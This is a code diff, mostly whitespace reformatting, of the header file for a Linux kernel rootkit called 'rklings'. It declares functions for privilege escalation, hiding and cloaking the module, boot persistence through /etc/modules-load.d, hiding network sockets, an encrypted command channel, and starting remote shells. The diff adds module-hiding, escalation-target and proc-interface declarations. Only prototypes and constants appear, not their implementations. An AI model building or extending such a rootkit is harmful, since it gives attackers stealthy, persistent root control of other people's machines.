@@ -12,31 +12,31 @@
 
 /* ---- Crypto constants ---- */
 
-#define RK_KEY_LEN		32
-#define RK_KEY_HEX_LEN		64
-#define RK_NONCE_LEN		12
-#define RK_TAG_LEN		16
-#define RK_HDR_LEN		18
+#define RK_KEY_LEN     32
+#define RK_KEY_HEX_LEN 64
+#define RK_NONCE_LEN   12
+#define RK_TAG_LEN     16
+#define RK_HDR_LEN     18
 
-#define RK_DIR_CLIENT		1
-#define RK_DIR_SERVER		2
+#define RK_DIR_CLIENT 1
+#define RK_DIR_SERVER 2
 
 /* ---- Protocol constants ---- */
 
-#define RK_FRAME_MAX		4096
-#define RK_CMD_MAX		256
-#define RK_ARG_MAX		128
-#define RK_CHUNK_SIZE		4096
+#define RK_FRAME_MAX  4096
+#define RK_CMD_MAX    256
+#define RK_ARG_MAX    128
+#define RK_CHUNK_SIZE 4096
 
 /* ---- Target list constants ---- */
 
-#define RK_TARGET_MAX		32
-#define RK_NAME_MAX		64
+#define RK_TARGET_MAX 32
+#define RK_NAME_MAX   64
 
 /* ---- Persistence ---- */
 
-#define PERSIST_PATH		"/etc/modules-load.d/rklings.conf"
-#define MODULE_NAME_STR		"rklings"
+#define PERSIST_PATH	"/etc/modules-load.d/rklings.conf"
+#define MODULE_NAME_STR "rklings"
 
 /* ---- Envelope header (matches M03) ---- */
 
@@ -50,19 +50,19 @@ struct rk_envelope_hdr {
 /* ---- Encrypted session ---- */
 
 struct rk_session {
-	struct crypto_aead	*tfm;
-	struct socket		*sock;
-	u64			session_id;
-	u64			tx_seq;
-	u64			rx_seq_expected;
+	struct crypto_aead *tfm;
+	struct socket *sock;
+	u64 session_id;
+	u64 tx_seq;
+	u64 rx_seq_expected;
 };
 
 /* ---- Target list (from M01) ---- */
 
 struct rk_target_list {
-	spinlock_t	lock;
-	char		targets[RK_TARGET_MAX][RK_NAME_MAX];
-	int		count;
+	spinlock_t lock;
+	char targets[RK_TARGET_MAX][RK_NAME_MAX];
+	int count;
 };
 
 /* ---- Dispatch handler type ---- */
@@ -88,24 +88,34 @@ extern struct rk_target_list rk_port_targets;
 /* ---- core/target.c ---- */
 
 void rk_target_init(struct rk_target_list *list);
-int  rk_target_add(struct rk_target_list *list, const char *name);
-int  rk_target_remove(struct rk_target_list *list, int idx);
+int rk_target_add(struct rk_target_list *list, const char *name);
+int rk_target_remove(struct rk_target_list *list, int idx);
+int rk_target_remove_name(struct rk_target_list *list, const char *name);
 void rk_target_clear(struct rk_target_list *list);
 bool rk_target_match(struct rk_target_list *list, const char *name);
 bool rk_line_matches(struct rk_target_list *list, const char *line, int len);
 
 /* ---- core/opsec.c ---- */
 
-int  rk_escalate(void);
-int  rk_escalate_pid(pid_t nr);
+int rk_escalate(void);
+int rk_escalate_pid(pid_t nr);
+void rk_set_escalate_pid(pid_t pid);
+void rk_hide_module(void);
+void rk_unhide_module(void);
 void rk_cloak(void);
 void rk_uncloak(void);
 bool rk_is_cloaked(void);
-int  rk_persist(void);
-int  rk_unpersist(void);
+int rk_persist(void);
+int rk_unpersist(void);
 bool rk_is_persisted(void);
 void rk_auto_hide(struct socket *sock);
 void rk_auto_unhide(void);
+int rk_proc_init(void);
+void rk_proc_exit(void);
+
+/* ---- core/filter.c (local mkdir dispatch) ---- */
+
+int rk_dispatch_local(const char *cmd);
 
 /* ---- core/filter.c (kretprobes) ---- */
 
@@ -168,8 +178,8 @@ int cmd_shell_status(struct rk_session *s, const char *arg);
 
 void rk_shells_init(void);
 void rk_shells_cleanup(void);
-int  rk_start_shell(unsigned short port, u32 request_id, u64 cookie);
-int  rk_start_exec_shell(unsigned short port, u32 request_id, u64 cookie);
+int rk_start_shell(unsigned short port, u32 request_id, u64 cookie);
+int rk_start_exec_shell(unsigned short port, u32 request_id, u64 cookie);
 void rk_shell_status(char *buf, size_t size);
 
 #endif /* ROOTKIT_H */
